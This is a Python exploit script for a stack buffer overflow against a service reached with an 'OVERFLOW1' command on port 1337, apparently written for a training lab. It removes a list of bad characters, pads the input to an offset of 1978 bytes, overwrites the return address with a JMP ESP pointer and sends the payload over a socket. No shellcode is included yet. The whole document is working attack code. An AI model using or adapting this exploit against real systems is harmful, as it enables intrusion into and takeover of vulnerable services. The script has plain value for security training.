#!/usr/bin/env python3

import socket
import struct

def p32(data):
	return struct.pack('<I', data)

host, port = "10.10.209.4", 1337

all_chars = bytearray(range(1,256))

bad_chars = [
	b"\x07",
	b"\x2d",
	b"\x2e",
	b"\xa0",
]

for bad_char in bad_chars:
	all_chars = all_chars.replace(bad_char, b"")

command = b"OVERFLOW1 "
length = 5000
offset = 1978
jmp_esp = p32(0x625011AF)

payload = b"".join([
	command,
	b"A" * offset,
	jmp_esp,
	b"C" * ( length - len(jmp_esp) - offset),
])

with socket.socket() as s:
	s.connect((host, port))
	s.send(payload)